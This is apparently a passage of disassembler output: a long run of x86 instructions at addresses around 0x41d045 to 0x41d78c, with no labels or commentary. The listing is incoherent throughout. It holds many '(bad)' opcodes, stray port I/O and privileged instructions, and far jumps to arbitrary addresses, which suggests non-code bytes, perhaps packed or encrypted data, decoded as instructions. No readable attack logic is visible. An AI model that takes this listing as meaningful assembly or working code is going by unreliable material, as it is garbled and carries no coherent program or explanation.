  41d045:	mov    esp,0xd99874e1
  41d04a:	popf   
  41d04b:	cmp    al,al
  41d04d:	test   al,0xd9
  41d04f:	fisubr WORD PTR [edx]
  41d051:	loope  0x41d003
  41d053:	aas    
  41d054:	add    dh,dl
  41d056:	push   0x531f74e1
  41d05b:	inc    esi
  41d05c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41d05e:	mov    esi,0x68b5232a
  41d063:	xchg   ebx,eax
  41d064:	push   edx
  41d065:	xor    al,0x42
  41d067:	bound  esi,QWORD PTR [eax]
  41d069:	adc    BYTE PTR [esp+eax*4-0x49],ah
  41d06d:	(bad)  
  41d06e:	mov    bl,0xa0
  41d070:	add    DWORD PTR [ebx],0xffffffb0
  41d073:	loop   0x41d043
  41d075:	pop    es
  41d076:	push   esi
  41d077:	test   al,0xe5
  41d079:	lahf   
  41d07a:	mov    esi,0xf335f833
  41d07f:	jl     0x41d0d3
  41d081:	hlt    
  41d082:	xlat   BYTE PTR ds:[ebx]
  41d083:	cli    
  41d084:	lea    ebp,[ebp-0x58]
  41d087:	(bad)  
  41d089:	adc    eax,0x8a95ace2
  41d08e:	push   ss
  41d08f:	sbb    eax,0xdf1df2dc
  41d094:	inc    edx
  41d095:	ja     0x41d099
  41d097:	ds data16 test al,0xde
  41d09b:	int3   
  41d09c:	(bad)  
  41d09d:	(bad)  
  41d09e:	neg    DWORD PTR [ecx+ecx*4]
  41d0a1:	cmp    eax,0xd88f9849
  41d0a6:	outs   dx,BYTE PTR ds:[esi]
  41d0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0a8:	nop
  41d0a9:	test   eax,0xf0d59f2f
  41d0ae:	pcmpeqd mm6,QWORD PTR [edx+0x53258b35]
  41d0b5:	aas    
  41d0b6:	mov    al,ds:0x6c7a5ea2
  41d0bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bc:	ins    BYTE PTR es:[edi],dx
  41d0bd:	ss std 
  41d0bf:	ds stos DWORD PTR es:[edi],eax
  41d0c1:	int    0xfa
  41d0c3:	mov    dh,0x91
  41d0c5:	push   0xf081a6e2
  41d0ca:	cmc    
  41d0cb:	pop    esp
  41d0cc:	daa    
  41d0cd:	pusha  
  41d0ce:	jb     0x41d127
  41d0d0:	mov    edx,0xcdd700a
  41d0d5:	pop    ss
  41d0d6:	pop    ss
  41d0d7:	test   BYTE PTR [ebp-0x21ee1570],al
  41d0dd:	cld    
  41d0de:	jmp    0x7bf119dd
  41d0e3:	das    
  41d0e4:	fstp   DWORD PTR [edi+0x3f5388d3]
  41d0ea:	or     eax,DWORD PTR [esi]
  41d0ec:	mov    ebx,0x10f5921
  41d0f1:	push   ecx
  41d0f2:	adc    al,BYTE PTR [eax+0x12]
  41d0f5:	ficom  DWORD PTR [esi+eax*4-0x48e29bc5]
  41d0fc:	daa    
  41d0fd:	aam    0x25
  41d0ff:	xchg   esi,eax
  41d100:	es ds not ebx
  41d104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d106:	std    
  41d107:	cmp    cl,BYTE PTR [ecx-0x4e]
  41d10a:	push   cs
  41d10b:	mov    bl,0x70
  41d10d:	lahf   
  41d10e:	lea    esi,[edx+0x50d8f38f]
  41d114:	and    eax,0xa637a15a
  41d119:	mov    al,0x5c
  41d11b:	retf   
  41d11c:	dec    esi
  41d11d:	outs   dx,BYTE PTR ds:[esi]
  41d11e:	pop    ss
  41d11f:	retf   0xab73
  41d122:	push   0xffffffda
  41d124:	dec    edi
  41d125:	test   BYTE PTR [edi],cl
  41d127:	mov    es,WORD PTR [ecx+edx*1-0x68]
  41d12b:	into   
  41d12c:	push   ecx
  41d12d:	push   0xb0cea271
  41d132:	popa   
  41d133:	js     0x41d189
  41d135:	push   ebp
  41d136:	out    0xf6,al
  41d138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d139:	sar    dh,1
  41d13b:	mov    bl,0xbe
  41d13d:	jbe    0x41d188
  41d13f:	outs   dx,BYTE PTR ds:[esi]
  41d140:	xchg   BYTE PTR [edi-0x253c8ff0],dh
  41d146:	fcomi  st,st(6)
  41d148:	scas   al,BYTE PTR es:[edi]
  41d149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d14a:	mov    esp,0x6493ce7a
  41d14f:	(bad)  
  41d150:	mov    al,0x12
  41d152:	pop    eax
  41d153:	mov    al,ds:0x3ab60feb
  41d158:	sbb    BYTE PTR [esi],bh
  41d15a:	cld    
  41d15b:	dec    esi
  41d15c:	mov    DWORD PTR [edx+ebp*1-0x25c51064],eax
  41d163:	(bad)  
  41d164:	addr16 dec ebx
  41d166:	pushf  
  41d167:	cli    
  41d168:	mov    edi,cs
  41d16a:	mov    edi,DWORD PTR [ecx+0x2cbf4f24]
  41d170:	dec    esp
  41d171:	or     eax,0x9bc61020
  41d176:	mov    ebp,0x31a5f88c
  41d17b:	push   esp
  41d17c:	int    0x5c
  41d17e:	ss stc 
  41d180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d181:	push   0x44
  41d183:	add    al,bh
  41d185:	mov    esp,0x6b735a26
  41d18a:	not    BYTE PTR [edi+0x43]
  41d18d:	pop    esi
  41d18e:	jnp    0x41d17e
  41d190:	pop    edi
  41d191:	inc    ecx
  41d192:	idiv   DWORD PTR [edi-0x13]
  41d195:	aad    0x83
  41d197:	push   0x7f26101c
  41d19c:	fld    DWORD PTR [ecx]
  41d19e:	sub    esi,esp
  41d1a0:	jl     0x41d179
  41d1a2:	xchg   dl,cl
  41d1a4:	adc    al,0x45
  41d1a6:	adc    ch,BYTE PTR [edx+0x3c]
  41d1a9:	aam    0x9d
  41d1ab:	mov    cl,0xcd
  41d1ad:	mov    ah,BYTE PTR ds:0xce76e45b
  41d1b3:	sbb    BYTE PTR [ecx+0x60b639d3],bl
  41d1b9:	mov    ebp,0x1f81a8a6
  41d1be:	sub    DWORD PTR [esi+0x3],esi
  41d1c1:	or     al,0xed
  41d1c3:	cmp    esi,DWORD PTR [edx-0x2da2d9ea]
  41d1c9:	stos   DWORD PTR es:[edi],eax
  41d1ca:	dec    ecx
  41d1cb:	xor    al,0x49
  41d1cd:	add    DWORD PTR [edi],ecx
  41d1cf:	std    
  41d1d0:	js     0x41d1ef
  41d1d2:	(bad)  
  41d1d3:	daa    
  41d1d4:	ficomp DWORD PTR [edi-0x7]
  41d1d8:	mov    esi,0xe71c2af5
  41d1dd:	out    dx,al
  41d1de:	ja     0x41d1eb
  41d1e0:	mov    al,0x42
  41d1e2:	mov    ebx,0x81725c75
  41d1e7:	mov    esi,0x19168d8a
  41d1ec:	push   esp
  41d1ed:	mov    ah,0xe8
  41d1ef:	mov    bl,0x25
  41d1f1:	sub    dl,al
  41d1f3:	add    eax,0x9986c770
  41d1f8:	imul   esi,DWORD PTR [esi+0x194f7cf0],0x6164188d
  41d202:	ds push 0xdaa118
  41d208:	push   ds
  41d209:	and    DWORD PTR [ecx],ebx
  41d20b:	and    ebp,DWORD PTR [edi-0x1]
  41d20e:	cwde   
  41d20f:	rol    ebp,0xfb
  41d212:	mov    ebx,0x67025d6b
  41d217:	stos   DWORD PTR es:[edi],eax
  41d218:	dec    ecx
  41d219:	xor    DWORD PTR [edx],esi
  41d21b:	popa   
  41d21c:	ror    DWORD PTR [ecx+0x7642e51b],0x9e
  41d223:	adc    al,BYTE PTR [edi]
  41d225:	sub    DWORD PTR [esi-0x67],ebp
  41d228:	call   0x2515:0xb52c3113
  41d22f:	in     al,dx
  41d230:	clc    
  41d231:	fisubr WORD PTR [edx]
  41d233:	ss inc ebx
  41d235:	mov    esp,0x3d97899c
  41d23a:	push   ecx
  41d23b:	xchg   esi,eax
  41d23c:	mov    cs,WORD PTR [esi+ebx*8]
  41d23f:	and    esi,DWORD PTR [edx-0x3b2f87e4]
  41d245:	push   eax
  41d246:	and    eax,0x5a768a81
  41d24b:	push   esi
  41d24c:	pop    esi
  41d24d:	jnp    0x41d25a
  41d24f:	test   eax,0xe4fe5986
  41d254:	push   esp
  41d255:	scas   al,BYTE PTR es:[edi]
  41d256:	dec    ax
  41d258:	retf   0x42a7
  41d25b:	test   BYTE PTR [ebx+ecx*8+0x13],ah
  41d25f:	inc    ecx
  41d260:	sar    BYTE PTR [edi+ebp*8-0x372a58e0],1
  41d267:	sti    
  41d268:	loop   0x41d25e
  41d26a:	or     edi,DWORD PTR cs:[ebx+0xdb56c60]
  41d271:	xor    cl,dl
  41d273:	dec    eax
  41d275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d276:	jge    0x41d2da
  41d278:	in     eax,dx
  41d279:	push   esp
  41d27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d27b:	cmc    
  41d27c:	adc    BYTE PTR [eax+0x5d],bl
  41d27f:	or     esp,DWORD PTR [edx]
  41d281:	(bad)  
  41d282:	hlt    
  41d283:	push   ss
  41d284:	pusha  
  41d285:	lahf   
  41d286:	int3   
  41d287:	jmp    0xcf5d0451
  41d28c:	fidiv  WORD PTR [ecx-0x65]
  41d28f:	(bad)  
  41d290:	clc    
  41d291:	scas   al,BYTE PTR es:[edi]
  41d292:	mov    bl,al
  41d294:	je     0x41d266
  41d296:	fs jle 0x41d266
  41d299:	ins    DWORD PTR es:[edi],dx
  41d29a:	mov    ds:0x5d30acae,eax
  41d29f:	xor    bh,ch
  41d2a1:	in     al,dx
  41d2a2:	aad    0x34
  41d2a4:	cld    
  41d2a5:	aas    
  41d2a6:	in     al,dx
  41d2a7:	inc    eax
  41d2a8:	sbb    DWORD PTR [ebx-0x24],eax
  41d2ab:	jmp    0x8257f61e
  41d2b0:	jmp    0x8f9b7028
  41d2b5:	mov    al,0x9f
  41d2b7:	push   ds
  41d2b8:	adc    dl,dh
  41d2ba:	xchg   ebx,eax
  41d2bb:	jge    0x41d2c7
  41d2bd:	pop    es
  41d2be:	dec    edx
  41d2bf:	mov    dl,0xf6
  41d2c1:	cmp    edi,DWORD PTR [esi+0x5f794ebd]
  41d2c7:	rol    bl,0x9c
  41d2ca:	call   0xa4c2c590
  41d2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2d0:	push   edi
  41d2d1:	test   BYTE PTR [edx],dl
  41d2d3:	lahf   
  41d2d4:	outs   dx,BYTE PTR ds:[esi]
  41d2d5:	ret    
  41d2d6:	mov    bh,0xc0
  41d2d8:	popa   
  41d2d9:	xchg   esp,eax
  41d2da:	push   ds
  41d2db:	mov    esi,0x367a1caa
  41d2e0:	aaa    
  41d2e1:	add    eax,0x59baaf4e
  41d2e6:	(bad)  
  41d2e7:	je     0x41d34e
  41d2e9:	mov    bh,0x9c
  41d2eb:	out    dx,eax
  41d2ec:	add    eax,0x846de3db
  41d2f1:	out    dx,al
  41d2f2:	dec    ebp
  41d2f3:	int    0xdc
  41d2f5:	mov    esi,0x38057506
  41d2fa:	(bad)  
  41d2fb:	shl    BYTE PTR [ecx],cl
  41d2fd:	mov    esp,0x2c4b4d62
  41d302:	adc    DWORD PTR [edi],eax
  41d304:	sbb    eax,0x6092c56a
  41d309:	or     ecx,DWORD PTR [ecx]
  41d30b:	adc    DWORD PTR [eax-0x7d],0x39c752ef
  41d312:	sbb    DWORD PTR [eax-0x5b941db3],eax
  41d318:	shl    DWORD PTR [ebp+0x7de1fbd2],1
  41d31e:	shr    eax,cl
  41d320:	cmp    bh,BYTE PTR [eax+0x77]
  41d323:	mov    esp,DWORD PTR [ebp+0x7]
  41d326:	add    DWORD PTR [ebx],ebx
  41d328:	scas   eax,DWORD PTR es:[edi]
  41d329:	jae    0x41d2d1
  41d32b:	pop    ecx
  41d32c:	mov    ch,0x84
  41d32e:	dec    esi
  41d32f:	add    esi,0x70c90467
  41d335:	xor    ah,BYTE PTR [edx]
  41d337:	(bad)  
  41d338:	cli    
  41d339:	dec    eax
  41d33a:	and    edx,eax
  41d33c:	push   ss
  41d33d:	fwait
  41d33e:	add    eax,0x1c3201ef
  41d343:	sub    DWORD PTR [edi-0x43],edi
  41d346:	jne    0x41d396
  41d348:	or     ch,dh
  41d34a:	adc    edi,DWORD PTR [eax+0x2617b212]
  41d350:	and    BYTE PTR [ecx+eax*2-0x5aa536c7],ch
  41d357:	les    esi,FWORD PTR [eax+eax*4-0x30]
  41d35b:	cwde   
  41d35c:	or     cl,bh
  41d35e:	xor    ebx,DWORD PTR [esi]
  41d360:	adc    bl,ah
  41d362:	repnz mov bl,0x36
  41d365:	daa    
  41d366:	xchg   esi,eax
  41d367:	push   edi
  41d368:	fbstp  TBYTE PTR [esi-0x16c809fa]
  41d36e:	or     DWORD PTR [ecx],edx
  41d370:	cmp    BYTE PTR [edx-0x5c],bl
  41d373:	adc    DWORD PTR ds:0xdf48c8af,edx
  41d379:	adc    ch,ah
  41d37b:	push   edx
  41d37c:	test   al,0x30
  41d37e:	dec    ebx
  41d37f:	lahf   
  41d380:	cmp    al,0x73
  41d382:	or     DWORD PTR [eax+0x41],eax
  41d385:	call   0x6829654f
  41d38a:	xchg   ebp,eax
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	lock pop ds
  41d38e:	dec    ecx
  41d38f:	mov    ds:0x4961a8bb,al
  41d394:	rcl    BYTE PTR [esi-0x53e6e5d5],0x64
  41d39b:	add    al,0x7d
  41d39d:	lods   al,BYTE PTR ds:[esi]
  41d39e:	ins    DWORD PTR es:[edi],dx
  41d39f:	push   ebx
  41d3a0:	pop    edi
  41d3a1:	ja     0x41d350
  41d3a3:	jmp    0x183f34a1
  41d3a8:	pop    esp
  41d3a9:	nop
  41d3aa:	add    edi,DWORD PTR [ecx-0x170cb9e0]
  41d3b0:	add    eax,DWORD PTR ds:[esi-0x13e6773c]
  41d3b7:	lods   al,BYTE PTR ds:[esi]
  41d3b8:	test   DWORD PTR [esi-0x19],ebp
  41d3bb:	in     eax,0x25
  41d3bd:	pop    edx
  41d3be:	inc    ecx
  41d3bf:	sti    
  41d3c0:	hlt    
  41d3c1:	add    DWORD PTR [edi],ebx
  41d3c3:	int    0x4d
  41d3c5:	out    0xe5,al
  41d3c7:	jb     0x41d394
  41d3c9:	fdivrp st(4),st
  41d3cb:	mov    dl,0xb9
  41d3cd:	retf   
  41d3ce:	(bad)  
  41d3cf:	fsubr  QWORD PTR [ecx+0x615d065]
  41d3d5:	jne    0x41d3e6
  41d3d7:	imul   ecx,esp,0xb23cf220
  41d3dd:	cdq    
  41d3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3df:	xchg   BYTE PTR [esi-0x59b49a44],bl
  41d3e5:	and    DWORD PTR ds:0xc2bb0774,esp
  41d3eb:	jne    0x41d40a
  41d3ed:	push   ebp
  41d3ee:	xchg   ebp,eax
  41d3ef:	or     ecx,esi
  41d3f1:	jmp    0x2b39e81a
  41d3f6:	sbb    esp,ebp
  41d3f8:	push   esp
  41d3f9:	adc    eax,0x3849c9a7
  41d3fe:	(bad)  
  41d3ff:	(bad)  
  41d400:	mov    esi,0x95516a6b
  41d405:	dec    ebx
  41d406:	inc    esi
  41d407:	xchg   esi,eax
  41d408:	pop    edi
  41d409:	out    dx,eax
  41d40a:	(bad)  
  41d40b:	retf   
  41d40c:	and    dl,BYTE PTR [edx+0x4dc649fc]
  41d412:	add    al,0xeb
  41d414:	dec    esp
  41d415:	retf   
  41d416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d417:	inc    ecx
  41d418:	inc    esp
  41d419:	int    0x8b
  41d41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d41c:	popa   
  41d41d:	(bad)  
  41d41e:	into   
  41d41f:	daa    
  41d420:	mov    esi,0xff2ef63
  41d425:	ds aam 0x53
  41d428:	mov    edx,0xa9de2053
  41d42d:	ins    DWORD PTR es:[edi],dx
  41d42e:	cmp    eax,0x4acacbe6
  41d433:	dec    ebp
  41d434:	out    0xe9,eax
  41d436:	test   eax,0xb4ad5bda
  41d43b:	adc    BYTE PTR [edi],0x79
  41d43e:	add    bh,BYTE PTR [ecx]
  41d440:	stos   BYTE PTR es:[edi],al
  41d441:	push   eax
  41d442:	jp     0x41d46b
  41d444:	test   eax,0xfa4d19a1
  41d449:	fwait
  41d44a:	loope  0x41d43c
  41d44c:	push   ds
  41d44d:	push   ecx
  41d44e:	or     DWORD PTR [edx-0x6c826b1a],eax
  41d454:	ror    DWORD PTR [ebx+edi*1+0x701b05f3],1
  41d45b:	dec    edi
  41d45c:	mov    fs,WORD PTR [eax+0x12]
  41d45f:	mov    dl,BYTE PTR [edx]
  41d461:	mov    BYTE PTR [edx+0xd],ch
  41d464:	push   0xffffff9d
  41d466:	mov    ecx,0xbd0058a9
  41d46b:	(bad)  
  41d46c:	jbe    0x41d4a3
  41d46e:	pop    ds
  41d46f:	dec    esp
  41d470:	ret    
  41d471:	push   ebp
  41d472:	xor    al,0x83
  41d474:	shr    DWORD PTR [ebx+edx*4],1
  41d477:	popa   
  41d478:	adc    ch,dh
  41d47a:	xlat   BYTE PTR ds:[ebx]
  41d47b:	loopne 0x41d4f4
  41d47d:	scas   eax,DWORD PTR es:[edi]
  41d47e:	aad    0xb3
  41d480:	cmc    
  41d481:	das    
  41d482:	in     al,0x86
  41d484:	(bad)  
  41d485:	or     al,0x1c
  41d487:	and    edi,DWORD PTR [eax]
  41d489:	mov    esp,0xa1aba127
  41d48e:	das    
  41d48f:	fwait
  41d490:	xchg   ebp,eax
  41d491:	rcr    ch,0xe3
  41d494:	int3   
  41d495:	xchg   esp,eax
  41d496:	bnd jge 0x41d460
  41d499:	push   0xac3fa670
  41d49e:	imul   ecx,DWORD PTR [edx],0x5f51fc7f
  41d4a4:	push   ebx
  41d4a5:	lea    ecx,[ebp+esi*2-0x7e]
  41d4a9:	inc    ecx
  41d4aa:	cmp    DWORD PTR ds:0xdd343228,esi
  41d4b0:	jl     0x41d465
  41d4b2:	sar    cl,0x93
  41d4b5:	jle    0x41d4ae
  41d4b7:	jne    0x41d518
  41d4b9:	cmp    dh,BYTE PTR [esi]
  41d4bb:	lahf   
  41d4bc:	ins    BYTE PTR es:[edi],dx
  41d4bd:	add    al,0x25
  41d4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4c0:	and    ah,BYTE PTR [esi+0x26]
  41d4c3:	scas   al,BYTE PTR es:[edi]
  41d4c4:	les    ecx,FWORD PTR [edx+0x7f]
  41d4c7:	(bad)  
  41d4c8:	test   eax,0x728227f5
  41d4cd:	xor    BYTE PTR [eax+0x46a84aa9],ch
  41d4d3:	and    bh,BYTE PTR [ecx+0x6623e49]
  41d4d9:	jmp    0xab78:0x85b74bbb
  41d4e0:	jns    0x41d47c
  41d4e2:	mov    DWORD PTR [edi+0x45],ecx
  41d4e5:	push   ebp
  41d4e6:	xor    BYTE PTR [edx],0x5b
  41d4e9:	int    0xa5
  41d4eb:	mov    eax,0xab78beeb
  41d4f0:	ror    dh,cl
  41d4f2:	or     BYTE PTR [esi-0x6b],ah
  41d4f5:	in     al,0x19
  41d4f7:	adc    eax,0x29206ad7
  41d4fc:	mov    ecx,0x428ad85a
  41d501:	(bad)  
  41d502:	punpckhwd mm7,mm3
  41d505:	jae    0x41d542
  41d507:	sbb    cl,BYTE PTR [ebx+eiz*8+0x7e2080f3]
  41d50e:	ja     0x41d51b
  41d510:	(bad)  
  41d511:	ja     0x41d544
  41d513:	mov    WORD PTR [ebp+edi*2+0x7d],?
  41d517:	iret   
  41d518:	mov    esp,0x6b2d6409
  41d51d:	fs test edi,ecx
  41d520:	outs   dx,DWORD PTR ds:[esi]
  41d521:	ret    
  41d522:	pop    esp
  41d523:	es and al,0x7b
  41d526:	mov    gs,WORD PTR [esi-0x2b]
  41d529:	int    0x23
  41d52b:	cmp    al,0x43
  41d52d:	jbe    0x41d586
  41d52f:	dec    eax
  41d530:	mov    esi,0x71f3d8da
  41d535:	dec    esi
  41d536:	jmp    0x3228:0x51e28b40
  41d53d:	mov    eax,ds:0x9e5b3149
  41d542:	aaa    
  41d543:	dec    esp
  41d544:	pop    edi
  41d545:	add    edx,DWORD PTR [ebp+0x7f]
  41d548:	jae    0x41d4db
  41d54a:	jp     0x41d4de
  41d54c:	nop
  41d54d:	stos   BYTE PTR es:[edi],al
  41d54e:	sbb    al,0x87
  41d550:	or     bh,al
  41d552:	dec    ebx
  41d553:	sub    DWORD PTR [eax-0x5693647d],0xa94a3d1
  41d55d:	jmp    0x723f0b05
  41d562:	xor    bl,bl
  41d564:	pushf  
  41d565:	push   esp
  41d566:	fwait
  41d567:	mov    al,BYTE PTR ds:[eax+0x7a0d72d1]
  41d56e:	test   ah,cl
  41d570:	stos   WORD PTR es:[edi],ax
  41d572:	repz jo 0x41d551
  41d575:	and    BYTE PTR [ebp-0x1c49c2a3],0x36
  41d57c:	jbe    0x41d5c4
  41d57e:	repnz sub eax,0xac54f89d
  41d584:	leave  
  41d585:	xchg   edi,eax
  41d586:	xor    esi,ebx
  41d588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d589:	popa   
  41d58a:	jge    0x41d5af
  41d58c:	jb     0x41d5b0
  41d58e:	dec    ebx
  41d58f:	sub    DWORD PTR [esi+0x37],esp
  41d592:	scas   al,BYTE PTR es:[edi]
  41d593:	andnps xmm4,xmm3
  41d596:	scas   eax,DWORD PTR es:[edi]
  41d597:	pop    ebp
  41d598:	mov    esi,0x9bbfb7b4
  41d59d:	les    ebx,FWORD PTR [edi+ebp*1]
  41d5a0:	loope  0x41d5f2
  41d5a2:	lods   al,BYTE PTR ds:[esi]
  41d5a3:	sub    cl,dl
  41d5a5:	push   ecx
  41d5a6:	cld    
  41d5a7:	lods   eax,DWORD PTR ds:[esi]
  41d5a8:	and    al,0xa7
  41d5aa:	and    edx,DWORD PTR [esp+ecx*4+0x38f77962]
  41d5b1:	pop    ebx
  41d5b2:	les    esi,FWORD PTR [ecx-0xfbae0bc]
  41d5b8:	xlat   BYTE PTR ds:[ebx]
  41d5b9:	imul   edx,DWORD PTR [edi-0x79],0xffffffe6
  41d5bd:	and    dl,BYTE PTR [esi+0x433755a4]
  41d5c3:	and    eax,0xb7c5a0eb
  41d5c8:	fdiv   st,st(2)
  41d5ca:	shl    DWORD PTR [esi-0x24],1
  41d5cd:	adc    edi,DWORD PTR [edi+esi*4-0x6aadcd11]
  41d5d4:	not    BYTE PTR [esp+eiz*4+0x3baac277]
  41d5db:	adc    BYTE PTR ss:[eax-0x3354fe93],dl
  41d5e2:	cmp    al,0xd
  41d5e4:	ret    
  41d5e5:	xor    esp,esi
  41d5e7:	sbb    ah,BYTE PTR [ebx+0x3f]
  41d5ea:	sub    edx,DWORD PTR [eax-0x30]
  41d5ed:	xchg   edx,eax
  41d5ee:	cmp    al,0x88
  41d5f0:	jecxz  0x41d664
  41d5f2:	cdq    
  41d5f3:	or     BYTE PTR [ebp+0x1bde871d],ah
  41d5f9:	jle    0x41d674
  41d5fb:	push   edx
  41d5fc:	mov    bl,0x76
  41d5fe:	inc    ebx
  41d5ff:	and    BYTE PTR [eax],ch
  41d601:	dec    ebx
  41d602:	adc    cl,ch
  41d604:	jge    0x41d59f
  41d606:	das    
  41d607:	idiv   cl
  41d609:	mov    eax,0x829f0da5
  41d60e:	ret    
  41d60f:	xchg   ebp,eax
  41d610:	pop    ds
  41d611:	popf   
  41d612:	mov    esi,0xd3e6725
  41d617:	xchg   edi,eax
  41d618:	stos   BYTE PTR es:[edi],al
  41d619:	cmp    eax,esi
  41d61b:	iret   
  41d61c:	inc    ebx
  41d61d:	std    
  41d61e:	mov    ds:0x373ada58,eax
  41d623:	repnz aam 0xfb
  41d626:	into   
  41d627:	mov    dh,0xc2
  41d629:	in     eax,0xc0
  41d62b:	pushf  
  41d62c:	aas    
  41d62d:	je     0x41d663
  41d62f:	gs out 0xaf,eax
  41d632:	jo     0x41d5d2
  41d634:	enter  0x2772,0x38
  41d638:	test   al,al
  41d63a:	xor    dl,BYTE PTR [edx+eax*8-0x2c]
  41d63e:	shr    BYTE PTR [edi+0x52],1
  41d641:	outs   dx,BYTE PTR ds:[esi]
  41d642:	mov    BYTE PTR [ecx+0x3ad41751],ch
  41d648:	dec    ecx
  41d649:	fsub   QWORD PTR [ebx+edi*1]
  41d64c:	jl     0x41d6b0
  41d64e:	in     eax,dx
  41d64f:	xchg   ebx,eax
  41d650:	mov    al,ds:0x1623a31
  41d655:	xor    eax,0x28cac96d
  41d65a:	rol    BYTE PTR [eax+0x45],0xd5
  41d65e:	and    BYTE PTR [edx+0x1276fe68],bl
  41d664:	inc    ebp
  41d665:	(bad)  
  41d668:	and    cl,bl
  41d66a:	cs inc eax
  41d66c:	jae    0x41d6b5
  41d66e:	pop    ebp
  41d66f:	dec    ebx
  41d670:	sub    BYTE PTR [ebp+0x78],0xce
  41d674:	fisub  WORD PTR [esi+0x55]
  41d677:	push   eax
  41d678:	pop    es
  41d679:	cmp    al,0x56
  41d67b:	dec    esi
  41d67c:	ja     0x41d689
  41d67e:	push   es
  41d67f:	dec    esp
  41d680:	popf   
  41d681:	bound  eax,QWORD PTR [ebx-0x1ecd6b8e]
  41d687:	fdiv   QWORD PTR [edi+eiz*4]
  41d68a:	out    dx,al
  41d68b:	adc    edi,DWORD PTR [ecx]
  41d68d:	(bad)  
  41d68f:	xchg   esi,eax
  41d690:	adc    eax,0xe224f735
  41d695:	fsubr  DWORD PTR [ecx+0x4faccb67]
  41d69b:	dec    ecx
  41d69c:	cwde   
  41d69d:	push   0x94103c28
  41d6a2:	add    ch,BYTE PTR [edi-0x6d]
  41d6a5:	lods   al,BYTE PTR ds:[esi]
  41d6a6:	pusha  
  41d6a7:	dec    edx
  41d6a8:	inc    ebp
  41d6a9:	gs stos DWORD PTR es:[edi],eax
  41d6ab:	xchg   edi,eax
  41d6ac:	jnp    0x41d6fe
  41d6ae:	fistp  WORD PTR [ebp-0x557a37be]
  41d6b4:	lock repnz aad 0x8a
  41d6b8:	jnp    0x41d644
  41d6ba:	jmp    0x41d6e2
  41d6bc:	sbb    eax,0xee871d7d
  41d6c1:	jle    0x41d70a
  41d6c3:	outs   dx,DWORD PTR ds:[esi]
  41d6c4:	push   ebx
  41d6c5:	mov    al,ds:0x6a157a62
  41d6ca:	sahf   
  41d6cb:	repnz inc edi
  41d6cd:	or     al,0x5c
  41d6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d0:	in     al,dx
  41d6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6d2:	outs   dx,DWORD PTR ds:[esi]
  41d6d3:	jp     0x41d6ac
  41d6d5:	int3   
  41d6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d7:	in     eax,dx
  41d6d8:	test   BYTE PTR [ecx+ebx*2+0x58a90571],0xf6
  41d6e0:	mov    ch,0x3
  41d6e2:	inc    eax
  41d6e3:	int3   
  41d6e4:	push   ecx
  41d6e5:	or     DWORD PTR [edi-0x2ffa29ef],ebx
  41d6eb:	(bad)  
  41d6ed:	call   0x9abb:0x998d6be9
  41d6f4:	fisub  WORD PTR [esi+0x5d0f375e]
  41d6fa:	retf   
  41d6fb:	add    al,0xe5
  41d6fd:	jp     0x41d706
  41d6ff:	neg    ebx
  41d701:	cmp    edx,eax
  41d703:	dec    ecx
  41d704:	je     0x41d75b
  41d706:	push   ss
  41d707:	inc    si
  41d709:	adc    al,cl
  41d70b:	mov    edi,0x3ff0df41
  41d710:	or     eax,0xcde9f324
  41d715:	leave  
  41d716:	adc    BYTE PTR [edx+0x3d],dl
  41d719:	cmp    edi,edx
  41d71b:	mov    ebx,0xaa62faa5
  41d720:	lods   eax,DWORD PTR ds:[esi]
  41d721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d722:	cli    
  41d723:	mov    dh,0xab
  41d725:	inc    esi
  41d726:	push   edi
  41d727:	lds    eax,FWORD PTR [esi-0x73a6be29]
  41d72d:	retf   0x10dd
  41d730:	test   DWORD PTR [ecx],ebp
  41d732:	fdiv   st,st(2)
  41d734:	out    dx,al
  41d735:	sbb    DWORD PTR [eax],esp
  41d737:	pop    ds
  41d738:	inc    ebx
  41d739:	sbb    BYTE PTR [edi+0x74],bh
  41d73c:	xchg   DWORD PTR [edi],ebx
  41d73e:	mov    cl,0x41
  41d740:	dec    ebp
  41d741:	dec    esi
  41d742:	jecxz  0x41d6d0
  41d744:	cli    
  41d745:	mov    cs,WORD PTR [ebp+ecx*4-0x7f358e2f]
  41d74c:	sbb    bl,BYTE PTR [eax-0x5e]
  41d74f:	or     edi,edi
  41d751:	jl     0x41d7bb
  41d753:	in     eax,0x64
  41d755:	jne    0x41d718
  41d757:	xor    dl,BYTE PTR [ebx]
  41d759:	cmp    al,0xde
  41d75b:	adc    dl,BYTE PTR [eax]
  41d75d:	mov    ebp,0x35e63a1f
  41d762:	pop    esp
  41d763:	scas   eax,DWORD PTR es:[edi]
  41d764:	mov    bl,0x8b
  41d766:	gs lahf 
  41d768:	stc    
  41d769:	aaa    
  41d76a:	mov    ds:0x94a3f61e,eax
  41d76f:	jge    0x41d702
  41d771:	or     DWORD PTR [ecx+0x156d5732],ebx
  41d777:	out    dx,al
  41d778:	dec    eax
  41d779:	add    al,0x95
  41d77b:	hlt    
  41d77c:	xchg   esp,eax
  41d77d:	aad    0xf3
  41d77f:	adc    ebx,ebp
  41d781:	adc    al,BYTE PTR [edx-0xd]
  41d784:	or     eax,0xe5a466c8
  41d789:	dec    ecx
  41d78a:	push   ebp
  41d78b:	pop    edi
  41d78c:	fwait
